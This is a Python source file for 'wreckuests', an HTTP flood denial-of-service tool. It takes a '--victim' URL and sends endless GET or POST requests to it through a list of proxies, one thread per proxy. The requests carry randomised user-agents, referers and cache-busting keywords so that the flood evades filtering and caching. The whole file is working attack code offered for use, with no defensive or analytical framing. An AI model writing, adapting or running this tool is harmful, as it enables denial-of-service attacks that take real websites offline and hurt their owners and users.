# -*- coding: utf-8 -*-
import sys, os, threading, random, requests, time, getopt, socket, urllib.parse
from threading import Thread, Event
from netaddr import IPNetwork, IPAddress
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse
from bs4 import BeautifulSoup

#versioning
VERSION = (0, 1, 3)
__version__ = '%d.%d.%d' % VERSION[0:3]

#if python ver < 3.5
if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('Python 3.5 or higher is required!')

#naming the files
proxy_file = 'files/proxy.txt'
ua_file = 'files/user-agents.txt'
ref_file = 'files/referers.txt'
keywords_file = 'files/keywords.txt'

# initializing variables
ex = Event()
ips = []
ref = []
keyword = []
ua = []
timeout = 10
proto = ''
post = False
searchword = ''

# arguments
url = ''
# if http auth
auth = True

# main
def main(argv):
	try:
		opts, args = getopt.getopt(argv, 'hv:p:a:t:', ['help', 'victim=', 'post=', 'auth=', 'timeout='])
	except getopt.GetoptError as err:
		print(err)
		showUsage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ('-h', '--help'):
			showUsage()
			sys.exit(2)
		elif opt in ('-v', '--victim'):
			if len(arg) >= 1:
				global url
				url = urllib.parse.unquote(arg)
				# defining protocol
				global proto
				link = urlparse(url)
				proto = link.scheme
			else:
				print('Parameter [--victim] must be a string and not to be empty!')
				sys.exit(2)
		elif opt in ('-p', '--post'):
			global post
			post = True
			global searchword
			searchword = arg
	parseFiles()

def parseFiles():
	#trying to find and parse file with proxies
	try:
		if os.stat(proxy_file).st_size > 0:
			with open(proxy_file) as proxy:
				global ips
				ips = [row.rstrip() for row in proxy]
		else: 
			print('Error: File %s is empty!' % proxy_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % proxy_file)
		sys.exit()
	#trying to find and parse file with User-Agents
	try:
		if os.stat(ua_file).st_size > 0:
			with open(ua_file) as user_agents:
				global ua
				ua = [row.rstrip() for row in user_agents]
		else:
			print('Error: File %s is empty' % ua_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ua_file)
		sys.exit()
	#trying to find and parse file with referers
	try:
		if os.stat(ref_file).st_size > 0:
			with open(ref_file) as referers:
				global ref
				ref = [row.rstrip() for row in referers]
		else:
			print('Error: File %s is empty!' % ref_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % ref_file)
		sys.exit()
	#trying to find and parse file with keywords
	try:
		if os.stat(keywords_file).st_size > 0:
			with open(keywords_file) as keywords:
				global keyword
				keyword = [row.rstrip() for row in keywords]
		else:
			print('Error: File %s is empty!' % keywords_file)
			sys.exit()
	except OSError:
		print('Error: %s was not found!' % keywords_file)
		sys.exit()
	#parse end
	startAttack()
	
def request(index):
	err_count = 0
	only_gzip = 0
	while not ex.is_set():
		headers = {'User-Agent': random.choice(ua),
			'Referer': random.choice(ref) + random.choice(keyword),
			'Accept-Encoding': 'gzip;q=0,deflate;q=0' if only_gzip < 5 else 'identity, deflate, compress, gzip, sdch, br',
			'Cache-Control': 'no-cache, no-store, must-revalidate',
			'Pragma': 'no-cache'}
		proxy = {proto: ips[index]}
		words = random.choice(keyword) + random.choice(keyword)
		postdata = {searchword :words}
		geturl = url + words;
		try:
			if post:
				r = requests.post(url, data=postdata, proxies=proxy, headers=headers, timeout=timeout)
				print(postdata)
			else:
				r = requests.get(geturl, proxies=proxy, headers=headers, timeout=timeout)
				print(geturl)
			print(r.status_code)
			print(r.text)
			now = time.asctime( time.localtime(time.time()) )
			print(now)

			if r.status_code == 406 and only_gzip < 5:
				only_gzip += 1
		except requests.exceptions.ChunkedEncodingError as e:
				print(e)	
				err_count += 1
		except requests.exceptions.ConnectionError as e:
				print(e)
				err_count += 1
		except requests.exceptions.ReadTimeout:
			pass
		if err_count >= 20:
			print("Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
			return

# Creating a thread pool
def startAttack():
	threads = []
	for i in range(len(ips)):
		t = threading.Thread(target=request, args=(i,))
		t.daemon = True
		t.start()
		threads.append(t)
		time.sleep(0.1)
	try:
		while True:
			time.sleep(0.1)
	except KeyboardInterrupt:
		ex.set()
		print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
		for t in threads:
			t.join()

def showUsage():
	print("Usage: wreckuests.py [-v] <victim's url> [-a] <login:pass> [-t] <timeout>\nPlease, read more about arguments in GitHub repository!")

if __name__ == '__main__':
	main(sys.argv[1:])
